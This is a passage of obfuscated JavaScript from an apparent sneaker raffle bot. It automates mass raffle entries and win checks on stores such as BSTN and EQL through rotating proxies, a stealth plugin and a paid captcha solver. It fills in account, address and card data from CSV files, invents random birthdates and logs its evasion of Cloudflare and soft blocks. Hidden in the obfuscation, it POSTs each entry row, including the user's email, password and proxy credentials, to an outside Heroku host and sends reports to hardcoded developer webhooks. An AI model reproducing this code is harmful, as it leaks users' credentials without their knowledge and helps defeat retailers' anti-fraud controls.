                            await _0x42c72a['send']('Browser.setWindowBounds', {
                                'windowId': _0x300568,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x488ffe(0x1388), await _0x2c55f2['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x2c55f2['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x488ffe(0x1f4), console['log'](_0x42a46a() + '\x20[' + _0x98f5cd['name'] + ']\x20Task\x20' + (_0x306531 + 0x1) + '\x20:\x20Logging\x20in'), await _0x2c55f2['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x3befc0 => _0x3befc0['click']()), await _0x2c55f2['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x2c55f2['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x488ffe(0x7d0), await _0x2c55f2['waitForSelector']('#email-login'), await _0x2c55f2['type']('#email-login', '' + _0x4246a3[_0x306531]['Email']), await _0x488ffe(0xdac), await _0x2c55f2['waitForSelector']('#password'), await _0x2c55f2['type']('#password', '' + _0x4246a3[_0x306531]['Password'], { 'delay': 0xe6 }), await _0x488ffe(0x157c);
                            try {
                                await _0x2c55f2['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x199885 => _0x199885['click']());
                            } catch {
                            }
                            try {
                                await _0x2c55f2['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x272bff) {
                            }
                            await _0x488ffe(0x3e8);
                            const _0x1d5dad = await _0x2c55f2['$']('.enteredDraw_container__2KmQ_');
                            if (_0x1d5dad)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x42a46a() + '\x20[' + _0x98f5cd['name'] + ']\x20Task\x20' + (_0x306531 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x4246a3[_0x306531]['Size']);
                            try {
                                if (_0x4246a3[_0x306531]['Size'] != 'RANDOM') {
                                    var _0x5d3342 = _0x4246a3[_0x306531]['Size']['replace']('.', ',');
                                    const _0x2a7072 = await _0x2c55f2['$x']('//div[contains(text(),\x20' + _0x5d3342 + ')]');
                                    await _0x2a7072[0x0]['click']();
                                } else {
                                    const _0x195c5e = await _0x2c55f2['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x19ba28 = Math['round'](Math['random']() * (_0x195c5e['length'] - 0x1));
                                    await _0x195c5e[_0x19ba28]['click']();
                                }
                            } catch {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0x488ffe(0x1f4);
                            const _0x533f82 = await _0x2c55f2['$']('.addressList_addressItem__LE2PB');
                            if (_0x533f82 && _0x4246a3[_0x306531]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x42a46a() + '\x20[' + _0x98f5cd['name'] + ']\x20Task\x20' + (_0x306531 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x2c55f2['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x488ffe(0x5dc), await _0x2c55f2['waitForSelector']('#firstname'), await _0x2c55f2['type']('#firstname', '' + _0x4246a3[_0x306531]['FirstName']), await _0x488ffe(0x1f4), await _0x2c55f2['waitForSelector']('#firstname'), await _0x2c55f2['type']('#lastname', '' + _0x4246a3[_0x306531]['LastName']), await _0x488ffe(0x1f4), await _0x2c55f2['waitForSelector']('#firstname'), await _0x2c55f2['type']('#street', '' + _0x4246a3[_0x306531]['Address1']), await _0x488ffe(0x1f4), await _0x2c55f2['waitForSelector']('#firstname'), await _0x2c55f2['type']('#houseNumber', _0x4246a3[_0x306531]['HouseNumber'] + '\x20' + _0x4246a3[_0x306531]['Address2']), await _0x488ffe(0x1f4), await _0x2c55f2['waitForSelector']('#firstname'), await _0x2c55f2['select']('#country_code', '' + _0x4246a3[_0x306531]['Country']), await _0x488ffe(0x1f4), await _0x2c55f2['type']('#postcode', '' + _0x4246a3[_0x306531]['Zip']), await _0x488ffe(0x1f4), await _0x2c55f2['type']('#city', '' + _0x4246a3[_0x306531]['City']), await _0x488ffe(0x1f4), await _0x2c55f2['type']('#telephone', '' + _0x4246a3[_0x306531]['Phone']), await _0x488ffe(0x1f4), await _0x2c55f2['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x488ffe(0x9c4);
                            try {
                                await _0x2c55f2['type']('#instagram_name', '' + _0x4246a3[_0x306531]['Follower']), await _0x2c55f2['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x42a46a() + '\x20[' + _0x98f5cd['name'] + ']\x20Task\x20' + (_0x306531 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x488ffe(0x5dc);
                            try {
                                await _0x2c55f2['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x488ffe(0x5dc), await _0x2c55f2['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x512d5d => _0x512d5d['click']()), await _0x488ffe(0x1388);
                            try {
                                await _0x2c55f2['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x2c55f2['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x4246a3[_0x306531]['Size'] != 'RANDOM') {
                                    var _0x5d3342 = _0x4246a3[_0x306531]['Size']['replace']('.', ',');
                                    const _0x4f66ad = await _0x2c55f2['$x']('//div[contains(text(),\x20' + _0x5d3342 + ')]');
                                    await _0x4f66ad[0x0]['click']();
                                } else {
                                    const _0x11090c = await _0x2c55f2['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x19ba28 = Math['round'](Math['random']() * (_0x11090c['length'] - 0x1));
                                    await _0x11090c[_0x19ba28]['click']();
                                }
                                await _0x488ffe(0x5dc);
                                try {
                                    await _0x2c55f2['hover']('#instagram_name'), await _0x2c55f2['type']('#instagram_name', '' + _0x4246a3[_0x306531]['Follower']), await _0x2c55f2['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x42a46a() + '\x20[' + _0x98f5cd['name'] + ']\x20Task\x20' + (_0x306531 + 0x1) + '\x20:\x20Retrying\x20(' + _0x48c5c4 + '\x20/\x205)');
                                try {
                                    await _0x2c55f2['hover']('.checkBox_boxHolder__wLGVe'), await _0x488ffe(0x5dc), await _0x2c55f2['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x488ffe(0x157c), await _0x2c55f2['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x800f2c => _0x800f2c['click']()), await _0x488ffe(0x1388), await _0x2c55f2['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x1615ac = 'no', _0xb5b21(_0x4246a3[_0x306531], _0x98f5cd);
                            try {
                                prxdata = {
                                    'username': _0x15d59c['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0x464a34),
                                    'proxy': '' + _0x29c160[_0x306531]
                                };
                                var _0x2ceef5 = JSON['stringify'](prxdata);
                                let _0x3c982d = { 'headers': { 'content-type': 'application/json' } };
                                await _0x1ea050['post']('https://jraffles.herokuapp.com/success', _0x2ceef5, _0x3c982d);
                            } catch (_0x1be4c2) {
                            }
                            console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x98f5cd['name'] + ']\x20Task\x20' + (_0x306531 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x5bd82a = await _0x5605d8(_0x4246a3[_0x306531], _0x98f5cd, 'dev', ![]), _0x330c22 = await _0x5605d8(_0x4246a3[_0x306531], _0x98f5cd, 'pub', ![]);
                            const _0x395d51 = {
                                'succesDEVMSG': { 'embeds': [_0x5bd82a] },
                                'succesPUBMSG': { 'embeds': [_0x330c22] }
                            };
                            let _0x464a34 = _0x4246a3[_0x306531];
                            try {
                                prxdata = {
                                    'username': _0x15d59c['replace']('#', ''),
                                    'module': _0x98f5cd['name'],
                                    'entrydata': JSON['stringify'](_0x464a34),
                                    'proxy': '' + _0x29c160[_0x306531]
                                };
                                var _0x2ceef5 = JSON['stringify'](prxdata);
                                let _0x2633c6 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x1ea050['post']('https://jraffles.herokuapp.com/success', _0x2ceef5, _0x2633c6);
                            } catch (_0x5426e8) {
                            }
                            try {
                                _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x395d51['succesDEVMSG']), await _0x488ffe(0xc8), await _0x49f827(_0xf35405, _0x395d51['succesDEVMSG']), await _0x488ffe(0xc8), await _0x49f827(_0x1bf959, _0x395d51['succesPUBMSG']);
                            } catch (_0xf7e10) {
                                console['log'](_0x387ef2['yellow'](_0x42a46a() + '\x20[' + _0x98f5cd['name'] + ']\x20Task\x20' + (_0x306531 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xf7e10));
                            }
                        } catch (_0x50d7c6) {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x98f5cd['name'] + ']\x20Task\x20' + (_0x306531 + 0x1) + '\x20:\x20' + _0x50d7c6)), _0x1615ac = 'yes', _0x411f24 = '' + _0x50d7c6;
                            var _0x1bc960 = await _0x5605d8(_0x4246a3[_0x306531], _0x98f5cd, 'dev', !![], _0x411f24), _0x5bd82a = await _0x5605d8(_0x4246a3[_0x306531], _0x98f5cd, 'dev', ![]), _0x330c22 = await _0x5605d8(_0x4246a3[_0x306531], _0x98f5cd, 'pub', ![]);
                            const _0x29fce5 = {
                                'succesDEVMSG': { 'embeds': [_0x5bd82a] },
                                'succesPUBMSG': { 'embeds': [_0x330c22] }
                            };
                            _0x29fce5['errorDEV'] = { 'embeds': [_0x1bc960] }, _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x29fce5['errorDEV']), await _0x49f827(_0x47580b, _0x29fce5['errorDEV']);
                        } finally {
                            _0x22579c['close']();
                            if (_0x1615ac == 'yes' && _0x48c5c4 != 0x5) {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x98f5cd['name'] + ']\x20Task\x20' + (_0x306531 + 0x1) + '\x20:\x20Retrying\x20(' + _0x48c5c4 + '\x20/\x205)')), _0x306531 = _0x306531 - 0x1, _0x48c5c4 = _0x48c5c4 + 0x1;
                                continue;
                            }
                            _0x1615ac == 'yes' && _0x48c5c4 >= 0x5 && (_0x2e6413(_0x4246a3[_0x306531], _0x98f5cd), _0x1615ac = 'no', _0x48c5c4 = 0x0), console['log'](_0x42a46a() + '\x20[' + _0x98f5cd['name'] + ']\x20Waiting\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x427feb, _0x2c36d2) {
                    _0x4ab5bb['use'](_0x44f368()), _0x4ab5bb['use'](_0x45c327({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5450ed['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0x4d653f;
                    try {
                        const _0x2007d0 = _0x7d8dbf['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x4d653f = _0x16e760['parse'](_0x2007d0, { 'header': !![] })['data'];
                    } catch (_0x282471) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x354f9d = 0x0; _0x354f9d < _0x4d653f['length']; _0x354f9d++) {
                        if (_0x274773 != 'yes')
                            var _0x274773 = '', _0x5cabc4 = 0x0;
                        var _0x253829;
                        _0x55ca22(_0x427feb['name'] + '\x20Task\x20' + (_0x354f9d + 0x1) + '\x20/\x20' + _0x4d653f['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947);
                        var _0x5daadb = await _0x5605d8(_0x4d653f[_0x354f9d], _0x427feb, 'acc', ![]);
                        const _0xd004a0 = { 'succesDEVMSG': { 'embeds': [_0x5daadb] } }, _0xc41aa2 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x383b42 = Math['round'](Math['random']() * (_0x2c36d2['length'] - 0x1)), _0x2365e8 = _0x2c36d2[_0x383b42]['split'](':'), _0x14a04e;
                        try {
                            _0x14a04e = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2365e8[0x0] + ':' + _0x2365e8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x14a04e = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2365e8[0x0] + ':' + _0x2365e8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xb47cfa = await _0x14a04e['newPage']();
                            await _0xb47cfa['authenticate']({
                                'username': '' + _0x2365e8[0x2],
                                'password': '' + _0x2365e8[0x3]
                            }), console['log'](_0x42a46a() + '\x20[' + _0x427feb['name'] + ']\x20Task\x20' + (_0x354f9d + 0x1) + '\x20:\x20Getting\x20Session'), await _0xb47cfa['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xb47cfa['setRequestInterception'](!![]), _0xb47cfa['on']('request', _0x3856db => {
                                _0x3856db['resourceType']() === 'image' ? _0x3856db['abort']() : _0x3856db['continue']();
                            });
                            try {
                                await _0xb47cfa['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0xb47cfa['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x274773 = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0xb47cfa['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x42a46a() + '\x20[' + _0x427feb['name'] + ']\x20Task\x20' + (_0x354f9d + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x488ffe(0x3e8), await _0xb47cfa['type']('#email', _0x4d653f[_0x354f9d]['Email']), await _0x488ffe(0x1f4), await _0xb47cfa['type']('#pass', _0x4d653f[_0x354f9d]['Password']), await _0x488ffe(0x1f4), await _0xb47cfa['$eval']('#login-form', _0x19eefc => _0x19eefc['submit']());
                            try {
                                await _0xb47cfa['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0x42a46a() + '\x20[' + _0x427feb['name'] + ']\x20Task\x20' + (_0x354f9d + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0x488ffe(0x190);
                            const _0x258069 = await _0xb47cfa['evaluate'](() => {
                                const _0x585bc6 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0x585bc6['map'](_0x419528 => _0x419528['alt']);
                            }), _0xdfeb7e = await _0xb47cfa['evaluate'](() => {
                                const _0x10fd75 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x10fd75['map'](_0x47d610 => _0x47d610['innerHTML']);
                            }), _0x18fb4d = await _0xb47cfa['$$']('.raffle-winner');
                            if (_0x18fb4d['length'] < 0x1) {
                                console['log'](_0x42a46a() + '\x20[' + _0x427feb['name'] + ']\x20Task\x20' + (_0x354f9d + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x274773 = 'no';
                                continue;
                            }
                            console['log'](_0x42a46a() + '\x20[' + _0x427feb['name'] + ']\x20Task\x20' + (_0x354f9d + 0x1) + '\x20:\x20' + _0x18fb4d['length'] + '\x20Wins\x20Found!');
                            for (var _0x29d22d = 0x0; _0x29d22d < _0x18fb4d['length']; _0x29d22d++) {
                                console['log'](_0x387ef2['green'](_0x258069[_0x29d22d] + _0xdfeb7e[_0x29d22d]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0x41d569) {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x427feb['name'] + ']\x20Task\x20' + (_0x354f9d + 0x1) + '\x20:\x20' + _0x41d569)), _0x253829 = '' + _0x41d569;
                            var _0x5b2439 = await _0x5605d8(_0x4d653f[_0x354f9d], _0x427feb, 'acc', !![], _0x253829);
                            _0xd004a0['errorDEV'] = { 'embeds': [_0x5b2439] }, _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0xd004a0['errorDEV']), await _0x49f827(_0x47580b, _0xd004a0['errorDEV']), _0x274773 = 'yes';
                        } finally {
                            if (_0x14a04e)
                                _0x14a04e['close']();
                            if (_0x274773 == 'yes' && _0x5cabc4 != 0x5) {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x427feb['name'] + ']\x20Task\x20' + (_0x354f9d + 0x1) + '\x20:\x20Retrying\x20(' + _0x5cabc4 + '\x20/\x205)')), _0x354f9d = _0x354f9d - 0x1, _0x5cabc4 = _0x5cabc4 + 0x1;
                                continue;
                            }
                            _0x274773 == 'yes' && _0x5cabc4 >= 0x5 && (_0x2e6413(_0x4d653f[_0x354f9d], _0x427feb), _0x274773 = 'no', _0x5cabc4 = 0x0), console['log'](_0x42a46a() + '\x20[' + _0x427feb['name'] + ']\x20Waiting\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x128f73, _0x47f85c, _0x399f06) {
                _0x4ab5bb['use'](_0x44f368()), _0x4ab5bb['use'](_0x45c327({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x5450ed['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x192b4f = 0x0; _0x192b4f < _0x47f85c['length']; _0x192b4f++) {
                    var _0x1f0b0d;
                    _0x55ca22(_0x128f73['name'] + '\x20Task\x20' + (_0x192b4f + 0x1) + '\x20/\x20' + _0x47f85c['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947);
                    try {
                        await _0x3215be(_0x47f85c, _0x192b4f);
                    } catch {
                        _0x4e14ae = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x1ad4d5(_0x5248a4) {
                        const _0x1c1ce7 = _0x7d8dbf['readFileSync']('../successful-tasks.csv', 'utf8'), _0x324c24 = _0x16e760['parse'](_0x1c1ce7, { 'header': !![] })['data'];
                        let _0x547815 = ![];
                        for (var _0x1efdb2 of _0x324c24) {
                            if (_0x1efdb2['Url'] == _0x5248a4['Url'] && _0x1efdb2['Email'] == _0x5248a4['Email']) {
                                _0x547815 = !![];
                                break;
                            }
                        }
                        return _0x547815;
                    }
                    if (await _0x1ad4d5(_0x47f85c[_0x192b4f]) == !![]) {
                        console['log'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x5ad517 = ![];
                    const _0x35c011 = _0x7d8dbf['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x8be061 = _0x16e760['parse'](_0x35c011, { 'header': !![] })['data'];
                    for (var _0x32623d of _0x8be061) {
                        _0x32623d['Email'] == _0x47f85c[_0x192b4f]['Email'] && (_0x5ad517 = !![]);
                    }
                    if (_0x5ad517 == ![]) {
                        var _0x2d05de;
                        if (_0x47f85c[_0x192b4f]['Url']['endsWith']('/')) {
                            _0x2d05de = _0x47f85c[_0x192b4f]['Url'] + 'register';
                            if (_0x4e14ae != 'yes')
                                var _0x4e14ae = '', _0x257a72 = 0x0;
                        } else {
                            _0x2d05de = _0x47f85c[_0x192b4f]['Url'] + '/register';
                            if (_0x4e14ae != 'yes')
                                var _0x4e14ae = '', _0x257a72 = 0x0;
                        }
                        if (_0x47f85c[_0x192b4f]['Email'] == '' || _0x47f85c[_0x192b4f]['FirstName'] == '' || _0x47f85c[_0x192b4f]['LastName'] == '') {
                            console['log'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x47f85c[_0x192b4f]['Password'] == '' && (_0x47f85c[_0x192b4f]['Password'] = 'JRaffles23!');
                        if (_0x5450ed['useRandomProxy'] = ![])
                            var _0x3dafc2 = _0x399f06[_0x192b4f]['split'](':');
                        else
                            var _0xa11581 = Math['round'](Math['random']() * (_0x399f06['length'] - 0x1)), _0x3dafc2 = _0x399f06[_0xa11581]['split'](':');
                        var _0x42ec8;
                        try {
                            _0x42ec8 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3dafc2[0x0] + ':' + _0x3dafc2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x42ec8 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3dafc2[0x0] + ':' + _0x3dafc2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x18a5c7 = await _0x42ec8['newPage']();
                            await _0x18a5c7['authenticate']({
                                'username': '' + _0x3dafc2[0x2],
                                'password': '' + _0x3dafc2[0x3]
                            }), console['log'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x18a5c7['setRequestInterception'](!![]), _0x18a5c7['on']('request', _0x401aa5 => {
                                _0x401aa5['resourceType']() === 'image' || _0x401aa5['resourceType']() === 'font' || _0x401aa5['resourceType']() === 'media' ? _0x401aa5['abort']() : _0x401aa5['continue']();
                            });
                            try {
                                await _0x18a5c7['goto'](_0x2d05de);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x488ffe(0x3e8), await _0x18a5c7['waitForSelector']('#email'), await _0x18a5c7['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x488ffe(0x3e8);
                            try {
                                await _0x18a5c7['click']('li[data-value=\x22EU\x20' + _0x47f85c[_0x192b4f]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x47f85c[_0x192b4f]['Size']);
                            }
                            await _0x488ffe(0x6a4), await _0x18a5c7['type']('#email', '' + _0x47f85c[_0x192b4f]['Email']), await _0x488ffe(0x352), await _0x18a5c7['waitForSelector']('#password'), await _0x18a5c7['type']('#password', '' + _0x47f85c[_0x192b4f]['Password']), await _0x488ffe(0x352), await _0x18a5c7['type']('#phone', '' + _0x47f85c[_0x192b4f]['Phone']), await _0x488ffe(0x352), await _0x18a5c7['type']('#firstName', '' + _0x47f85c[_0x192b4f]['FirstName']), await _0x488ffe(0x352), await _0x18a5c7['type']('#lastName', '' + _0x47f85c[_0x192b4f]['LastName']), await _0x488ffe(0x352);
                            _0x47f85c[_0x192b4f]['Url']['includes']('footlocker.de') ? await _0x18a5c7['type']('#birthdate', _0x1fafbb(0x1, 0x1c) + '.' + _0x1fafbb(0x1, 0xc) + '.' + _0x1fafbb(0x7c6, 0x7d3)) : await _0x18a5c7['type']('#birthdate', _0x1fafbb(0x1, 0x1c) + '-' + _0x1fafbb(0x1, 0xc) + '-' + _0x1fafbb(0x7c6, 0x7d3));
                            await _0x488ffe(0x352), await _0x18a5c7['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                await _0x18a5c7['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x488ffe(0x1f4), await _0x18a5c7['click']('#stateAutocomplete'), console['log'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Setting\x20Address'), await _0x488ffe(0x1f4);
                            try {
                                const _0x316c64 = await _0x18a5c7['$x']('//li[text()=\x22' + _0x47f85c[_0x192b4f]['State'] + '\x22]');
                                await _0x316c64[0x0]['click']();
                            } catch {
                                throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                            }
                            await _0x488ffe(0x3e8), await _0x488ffe(0x1f4), await _0x18a5c7['type']('#address1', _0x47f85c[_0x192b4f]['Address1'] + '\x20' + _0x47f85c[_0x192b4f]['HouseNumber']), await _0x488ffe(0x1f4), await _0x18a5c7['type']('#address2', '' + _0x47f85c[_0x192b4f]['Address2']), await _0x488ffe(0x1f4), await _0x18a5c7['type']('#city', '' + _0x47f85c[_0x192b4f]['City']), await _0x488ffe(0x1f4), await _0x18a5c7['type']('#postcode', '' + _0x47f85c[_0x192b4f]['Zip']), await _0x488ffe(0x3e8), await _0x18a5c7['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x488ffe(0x3e8), console['log'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Solving\x20Adyen');
                            try {
                                await _0x18a5c7['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]');
                            } catch {
                                throw new Error('No\x20Payment\x20Token\x20Found');
                            }
                            await _0x488ffe(0x7d0), await _0x18a5c7['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x488ffe(0x12c), await _0x18a5c7['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x488ffe(0x4b0), await _0x18a5c7['keyboard']['type']('' + _0x47f85c[_0x192b4f]['CardNumber']), await _0x488ffe(0x320), await _0x18a5c7['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x18a5c7['keyboard']['type']('' + _0x47f85c[_0x192b4f]['ExpiryDate']), await _0x488ffe(0x4b0), await _0x18a5c7['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x18a5c7['keyboard']['type']('' + _0x47f85c[_0x192b4f]['CVV']), await _0x488ffe(0x226), await _0x18a5c7['type']('input[name=\x22postalCode\x22]', '' + _0x47f85c[_0x192b4f]['Zip']), await _0x488ffe(0x226), await _0x18a5c7['click']('#paymentConsent'), await _0x488ffe(0x226), await _0x18a5c7['click']('#termsConsent'), await _0x488ffe(0x2bc), console['log'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x18a5c7['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x488ffe(0x2710);
                            try {
                                await _0x18a5c7['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x488ffe(0xbb8), await _0x18a5c7['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x416458 => _0x416458['click']()), await _0x18a5c7['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x5430f8 => _0x5430f8['click']());
                            } catch {
                            }
                            try {
                                await _0x18a5c7['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x12f5f5 = await _0x18a5c7['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x12f5f5) {
